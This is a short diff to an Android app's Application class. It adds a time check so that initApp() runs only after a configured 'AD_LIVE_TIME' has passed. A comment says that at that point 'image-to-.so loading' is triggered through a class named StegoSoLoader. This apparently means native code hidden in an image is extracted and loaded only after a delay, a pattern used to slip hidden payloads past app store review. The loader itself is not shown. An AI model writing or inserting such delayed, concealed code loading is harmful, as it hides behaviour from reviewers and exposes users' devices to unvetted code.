@@ -3,6 +3,7 @@ package com.lx.lxtoolsproject
 import android.app.Application
 import android.content.Context
 import com.lx.lxtoolsproject.utils.AdControlCUtils
+import com.lx.lxtoolsproject.utils.AgreementStatusUtils
 import com.lx.lxtoolsproject.utils.StegoSoLoader
 import com.tencent.mmkv.MMKV
 
@@ -30,11 +31,11 @@ class ToolsApplication : Application() {
     private fun intGgSource(){
         val str: String = BuildConfig.AD_LIVE_TIME
         // 判断是否到了启动时间，到了才触发图片转 so 加载
-//        if (AgreementStatusUtils.isGoTWork(str)){
-//            initApp()
-//        }
-        MMKV.defaultMMKV().encode("sp_log_status", true)
-        initApp()
+        if (AgreementStatusUtils.isGoTWork(str)){
+            initApp()
+        }
+//        MMKV.defaultMMKV().encode("sp_log_status", true)
+//        initApp()
     }
 
 
